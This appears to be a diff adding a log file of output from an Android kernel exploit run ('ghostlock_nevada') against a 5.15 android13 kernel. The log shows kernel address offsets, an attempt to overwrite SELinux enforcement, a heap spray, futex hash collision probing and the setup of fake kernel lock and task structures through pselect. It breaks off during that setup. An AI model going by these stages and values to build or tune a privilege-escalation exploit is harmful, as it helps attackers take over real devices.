@@ -1,0 +1,19 @@
+[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
+[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
+[32m[+] [0mstartup context pid=6415 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=6415 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=6415 label=ghostlock_nevada slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=6415 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0m[T+1342ms] pre-W1 drain
+[33m[*] [0mWrite 1 attempt 1/5
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
+[33m[*] [0m[T+1342ms]   heap spray start
+[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
+[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[16341..16768] slowest_rejected=5
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+13667ms]   heap spray done
+[31m[-] [0mpselect cannot place tree_pc waiter_word=2 global_word=-3 words_per_set=5 nfds=320
+[31m[-] [0mpselect cannot place tree_right waiter_word=3 global_word=-2 words_per_set=5 nfds=320
+[31m[-] [0mpselect cannot place tree_left waiter_word=4 global_word=-1 words_per_set=5 nfds=320
+[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-5 page=ffffff80f9558000 fake_lock=ffffff80f9558000 fake_w0=ffffff80f9558300 fake_task=ffffff80f9558400 in0=0000000000000000 in3=ffffff80f9558400 out0=0000000000000003 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
